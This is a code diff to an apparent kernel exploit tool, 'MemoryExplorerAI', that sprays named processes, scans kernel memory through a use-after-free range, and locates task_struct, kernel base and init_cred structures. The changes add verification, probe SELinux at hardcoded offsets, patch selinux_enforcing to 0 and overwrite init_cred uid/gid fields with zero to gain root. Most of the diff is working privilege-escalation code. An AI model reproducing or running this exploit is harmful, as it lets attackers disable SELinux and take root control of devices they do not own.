@@ -18,6 +18,16 @@ import datetime
 import fcntl
 import ctypes
 
+# Portable memmem() for Python (find needle in haystack)
+def memmem(haystack, haystack_len, needle, needle_len):
+    if needle_len == 0 or haystack_len < needle_len:
+        return None
+    end = haystack_len - needle_len
+    for i in range(end + 1):
+        if haystack[i:i+needle_len] == needle:
+            return i
+    return None
+
 # ============== ANSI COLORS ==============
 class C:
     RST   = "\033[0m"
@@ -181,7 +191,8 @@ class MemoryExplorerAI:
     def classify_page(self, page_data, va, sig=0, off_in_page=-1):
         """Classify a found memory page. sig comes from the C engine
         (1=task_struct with KETO0422, 2=system app, 3=kernel ELF, 4=init_cred,
-         5=SELinux enforcing, 6=kernel pointer/cred). 100% when sig>0."""
+         6=cred pointer). 100% when sig>0. SELinux is no longer found by
+        random scan — it must be probed via _probe_selinux (known offset)."""
         # 1. task_struct with KETO0422 comm (from spray) — this is 100% a task_struct
         if sig == 1:
             cred_va = va + (self.cred_offset - off_in_page)
@@ -207,11 +218,6 @@ class MemoryExplorerAI:
         if sig == 4:
             return {"type": "Privilege Struct", "description": "init_cred (100% cred)",
                     "va": hex(va), "confidence": 100, "data": page_data}
-        # 5. SELinux enforcing — 100% SELinux control
-        if sig == 5:
-            val = int.from_bytes(page_data[off_in_page:off_in_page+4], "little")
-            return {"type": "SELinux", "description": f"selinux_enforcing={val} (100% match)",
-                    "va": hex(va), "confidence": 100, "data": page_data}
         # 6. cred pointer — 100% it's a task_struct cred field
         if sig == 6:
             cred_va = va + off_in_page
@@ -220,6 +226,14 @@ class MemoryExplorerAI:
                     "va": hex(va), "confidence": 100, "data": page_data}
 
         # Fallback heuristic classification (no sig from engine)
+        # NOTE: no SELinux here — SELinux only via _probe_selinux (known offset)
+        idx = page_data.find(b"KETO0422")
+        if idx >= 0:
+            # If we got a task_struct without sig (shouldn't happen), still mark 100%
+            cred_va = va + (self.cred_offset - idx) if idx >= 0 else 0
+            return {"type": "Privilege Struct",
+                    "description": f"task_struct (KETO0422) cred @ {cred_va:#x}",
+                    "va": hex(va), "confidence": 100, "data": page_data}
         for pkg, name in self.system_apps.items():
             if pkg.encode() in page_data:
                 return {"type": "System App", "description": name, "va": hex(va),
@@ -607,20 +621,60 @@ class MemoryExplorerAI:
         return None
 
     def _probe_selinux(self, kbase):
-        """Try reading selinux_enforcing at kbase+offset. Return (va, val) or None."""
+        """Strict SELinux enforcing probe: try known offsets, verify via engine
+        'selinux' command (3 reads, must be stable 0 or 1)."""
         for off in self.selinux_offset_candidates:
             va = kbase + off
-            data = self.read_page(va)
-            if not data or len(data) < 8:
+            if not self._engine_write(f"selinux {hex(va)}\n".encode()):
                 continue
-            val = int.from_bytes(data[0:4], "little")
-            if val in (0, 1):
-                return (va, val)
+            deadline = time.time() + 5
+            while time.time() < deadline:
+                line = self._readline_timeout(timeout=1.0)
+                if not line:
+                    continue
+                if line.startswith("SELINUX:OK:") and ":stable" in line:
+                    parts = line.split(":")
+                    # SELINUX:OK:<va>:<val>:stable
+                    val = int(parts[3])
+                    return (va, val)
+                if line.startswith("SELINUX:"):
+                    # READ_FAIL / UNSTABLE / FAIL — try next offset
+                    break
+                if line is None:
+                    break
+        return None
+
+    def _verify_init_cred(self, va):
+        """Use engine 'cred' command to verify init_cred at va."""
+        if not self._engine_write(f"cred {hex(va)}\n".encode()):
+            return None
+        deadline = time.time() + 5
+        while time.time() < deadline:
+            line = self._readline_timeout(timeout=1.0)
+            if not line:
+                continue
+            if line.startswith("CRED:OK:") and ":root" in line:
+                return "root"
+            if line.startswith("CRED:OK:"):
+                return "valid"
+            if line.startswith("CRED:"):
+                return None
+            if line is None:
+                return None
         return None
 
     def _find_init_cred(self, kbase):
-        """init_cred is a struct at kbase + INIT_CRED_OFFSET."""
-        return kbase + self.init_cred_offset
+        """init_cred is at kbase + INIT_CRED_OFFSET. Returns VA if verified, else kbase+offset."""
+        va = kbase + self.init_cred_offset
+        result = self._verify_init_cred(va)
+        if result is not None:
+            return va
+        # Try alternate offsets
+        for off in (0x018f9038, 0x018a5038, 0x01973038, 0x01939038):
+            alt = kbase + off
+            if self._verify_init_cred(alt) is not None:
+                return alt
+        return None
 
     def get_ram_usage(self):
         try:
@@ -728,7 +782,7 @@ class MemoryExplorerAI:
                     self._add_found(
                         va=hex(sel_va),
                         type="SELinux",
-                        desc=f"selinux_enforcing={val} (100% match)",
+                        desc=f"selinux_enforcing={val} (verified stable)",
                         confidence=100,
                     )
                     # Patch SELinux enforcing -> 0 (disable)
@@ -738,35 +792,42 @@ class MemoryExplorerAI:
                     self._add_found(
                         va=hex(sel_va),
                         type="SELinux (PATCHED)",
-                        desc=f"selinux_enforcing=0 (was {val})",
+                        desc=f"selinux_enforcing=0 (was {val}, verified)",
                         confidence=100,
                     )
+                else:
+                    self.live["last_msg"] = "AUTO: SELinux NOT verified (no stable value at known offsets)"
+                    self.log_event("auto_selinux_fail", {"kbase": hex(kbase)})
 
                 self.live["last_msg"] = f"AUTO: locating init_cred @ 0x{self.init_cred_offset:x}…"
                 ic = self._find_init_cred(kbase)
                 if ic is not None:
                     self.cred_va = ic
-                    self.log_event("auto_init_cred", {"va": hex(ic)})
+                    cred_verify = self._verify_init_cred(ic)
+                    self.log_event("auto_init_cred", {"va": hex(ic), "verify": cred_verify})
                     self._add_found(
                         va=hex(ic),
                         type="Privilege Struct",
-                        desc="init_cred (100% cred struct)",
+                        desc=f"init_cred (verified={cred_verify})",
                         confidence=100,
                     )
-                    # Patch init_cred uid/gid to 0 (root)
-                    for off in (4, 8, 12, 16, 20, 24):  # uid,gid,suid,sgid,euid,egid
+                    # Patch init_cred uid/gid/euid/egid to 0 (root)
+                    for off in (4, 8, 12, 16, 20, 24):
                         self.patch_mem(ic + off, 0)
                     self._add_found(
                         va=hex(ic),
                         type="Privilege Struct (ROOTED)",
-                        desc="init_cred uid/gid set to 0 (100% root)",
+                        desc=f"init_cred uid/gid=0 (verified={cred_verify})",
                         confidence=100,
                     )
+                else:
+                    self.live["last_msg"] = "AUTO: init_cred NOT verified (no cred struct at known offsets)"
+                    self.log_event("auto_init_cred_fail", {"kbase": hex(kbase)})
 
+                sel_str = f"0x{sel[0]:x}" if sel else "N/A"
+                ic_str  = f"0x{ic:x}" if ic else "N/A"
                 self.live["last_msg"] = (
-                    f"AUTO DONE: kbase=0x{kbase:x}"
-                    f" selinux=0x{sel[0]:x}" if sel else " selinux=N/A"
-                ) + f" cred=0x{ic if ic else 0:x}"
+                    f"AUTO DONE: kbase=0x{kbase:x} selinux={sel_str} cred={ic_str}")
             except Exception as e:
                 self.live["last_msg"] = f"Exploit error: {e}"
                 self.log_event("exploit_error", {"err": str(e)})
@@ -903,41 +964,66 @@ class MemoryExplorerAI:
         return "BG started"
 
     def _learning_worker(self):
+        """AI learning loop: spray → scan → verify → learn → repeat.
+        Uses strict verification (selinux/cred/kbase engine commands) to filter
+        false positives, and persists successful ranges to knowledge_base."""
         import subprocess as _sp
-        libc = ctypes.CDLL(None)
-        PR_SET_NAME = 15
         target_total = 1000
         batch = 100
         done = 0
         self.live["spray_target"] = target_total
         self.live["spray_count"] = 0
         self.live["kill_count"] = 0
+        # Track stats per batch
+        self.learn_stats = {
+            "batches": 0, "matches": 0, "verified": 0,
+            "false_positives": 0, "sprayed_total": 0,
+        }
+
+        def _adaptive_scan_range(batch_idx):
+            """Narrow the scan range based on what's been found. AI 'learns'."""
+            # If we found kernel_base, scan around it for SELinux/cred
+            if self.kernel_base:
+                # 32MB window around kernel base
+                start = self.kernel_base & ~0xFFFFFFF
+                end = start + 0x2000000
+                return (start, end)
+            # Otherwise use the default UAF range
+            return (self.uaf_start, self.uaf_start + self.scan_size)
 
         while done < target_total and not self.cancel_flag.is_set():
+            # Respect RAM budget
+            if self.get_ram_usage() > 70.0:
+                self.live["last_msg"] = "LEARN: RAM > 70%, killing sprays, scanning…"
+                for pid in list(self.spray_procs):
+                    try: os.kill(pid, 9)
+                    except: pass
+                self.spray_procs.clear()
+                time.sleep(2)
+
             if not self.ensure_engine():
                 time.sleep(1)
                 continue
 
+            # 1) SPRAY a batch
             batch_pids = []
             spray_batch_start = done
             for i in range(batch):
                 if self.cancel_flag.is_set():
                     break
+                if self.get_ram_usage() > 60.0:
+                    break
                 try:
-                    # Use subprocess.Popen instead of os.fork() to avoid
-                    # "fork in multi-threaded process" deadlock warning.
                     name = f"KETO{(spray_batch_start + i) % 10000:04d}"
                     p = _sp.Popen(
-                        ["sh", "-c",
-                         f"exec -a {name} sleep 3600"],
+                        ["sh", "-c", f"exec -a {name} sleep 3600"],
                         stdout=_sp.DEVNULL, stderr=_sp.DEVNULL,
                         preexec_fn=lambda n=name: self._set_comm(n),
                     )
                     batch_pids.append(p.pid)
                     self.spray_procs.append(p.pid)
-                    # log spray
-                    self.log_event("spray", {"pid": p.pid,
-                                              "name": name,
+                    self.learn_stats["sprayed_total"] += 1
+                    self.log_event("spray", {"pid": p.pid, "name": name,
                                               "batch": spray_batch_start // batch})
                     time.sleep(0.001)
                 except OSError as e:
@@ -945,12 +1031,14 @@ class MemoryExplorerAI:
                     break
             self.live["spray_count"] += len(batch_pids)
             time.sleep(0.2)
+            self.learn_stats["batches"] += 1
 
+            # 2) SCAN with adaptive range
             if not self.ensure_engine():
                 continue
-
+            s_start, s_end = _adaptive_scan_range(done // batch)
             if not self._engine_write(
-                f"scan {hex(self.uaf_start)} {hex(self.uaf_start + self.scan_size)}\n".encode()):
+                f"scan {hex(s_start)} {hex(s_end)}\n".encode()):
                 self.log_event("learning_scan_error", {"err": "engine write failed"})
                 continue
 
@@ -979,20 +1067,38 @@ class MemoryExplorerAI:
                             off_in_page = int(parts[3]) if len(parts) > 3 else -1
                         except Exception:
                             continue
-                        self.live["scan_offset"] = va - self.uaf_start
+                        self.live["scan_offset"] = va - s_start
                         data = self._read_data_packet()
-                        if data and not any(int(it['va'], 16) == va for it in self.found_items):
-                            with self.bg_lock:
-                                self.found_items.append(self.classify_page(data, va, sig, off_in_page))
-                            self.log_event("scan_match", {"va": va,
-                                                           "type": self.found_items[-1]['type']})
+                        if not data:
+                            continue
+                        self.learn_stats["matches"] += 1
+                        # 3) CLASSIFY & VERIFY (filter false positives)
+                        # Always require KETO0422 or kernel ELF/cred pointer to be 100%
+                        if sig in (1, 3, 4, 6) or self._is_real_task_struct(data):
+                            if not any(int(it['va'], 16) == va for it in self.found_items):
+                                with self.bg_lock:
+                                    self.found_items.append(
+                                        self.classify_page(data, va, sig, off_in_page))
+                                self.log_event("scan_match", {"va": va,
+                                                               "type": self.found_items[-1]['type'],
+                                                               "sig": sig})
+                                self.learn_stats["verified"] += 1
+                                # Cross-correlate: if we found a task_struct, the kernel
+                                # base is likely nearby — record it
+                                if sig == 1 and off_in_page >= 0:
+                                    possible_kbase = va & ~0xFFFFFF  # 16MB aligned
+                                    self.knowledge_base.setdefault("candidate_kbases", []).append(hex(possible_kbase))
+                        else:
+                            self.learn_stats["false_positives"] += 1
+                            self.log_event("scan_filter", {"va": va, "sig": sig,
+                                                            "reason": "weak signature"})
                 if scan_done:
                     done += batch
                     self.live["spray_count"] = done
             except Exception as e:
                 self.log_event("learning_scan_error", {"err": str(e)})
 
-            # Kill
+            # 4) KILL spray processes (free RAM)
             for pid in batch_pids:
                 try:
                     os.kill(pid, 9)
@@ -1003,11 +1109,46 @@ class MemoryExplorerAI:
                 self.log_event("kill", {"pid": pid})
             time.sleep(0.05)
 
+            # 5) Update last_msg with learning stats
+            s = self.learn_stats
+            self.live["last_msg"] = (
+                f"LEARN: batch {s['batches']} | sprayed={s['sprayed_total']} | "
+                f"matches={s['matches']} | verified={s['verified']} | "
+                f"false_pos={s['false_positives']}")
+            # Persist learning stats
+            try:
+                with open(os.path.join(os.path.dirname(os.path.abspath(__file__)),
+                                       "learn_stats.json"), "w") as f:
+                    json.dump(s, f, indent=2)
+            except Exception:
+                pass
+
         self.live["spray_target"] = 0
         if self.cancel_flag.is_set():
-            self.live["last_msg"] = f"Learning cancelled at {done}/{target_total}."
+            self.live["last_msg"] = (
+                f"Learning cancelled at {done}/{target_total}. "
+                f"Verified={self.learn_stats['verified']} FalsePos={self.learn_stats['false_positives']}")
         else:
-            self.live["last_msg"] = f"Learning complete. {done} processes."
+            self.live["last_msg"] = (
+                f"Learning complete. {done} processes. "
+                f"Verified={self.learn_stats['verified']} FalsePos={self.learn_stats['false_positives']}")
+        self.log_event("learning_done", self.learn_stats)
+
+    def _is_real_task_struct(self, data):
+        """Heuristic: is this a real task_struct page?
+        Strong indicators: KETO0422, com.android., comm string at 0x718."""
+        if not data or len(data) < 0x800:
+            return False
+        if data.find(b"KETO0422") >= 0:
+            return True
+        if data.find(b"com.android.") >= 0:
+            return True
+        # comm at 0x718 — printable ASCII string
+        comm = data[self.comm_offset:self.comm_offset + 16]
+        s = comm.split(b"\x00")[0]
+        if 1 < len(s) < 16 and all(0x20 <= c <= 0x7e for c in s):
+            return True
+        return False
 
     def cmd_learning_cancel(self):
         """Cancel running learning loop (Ctrl+P shortcut)."""
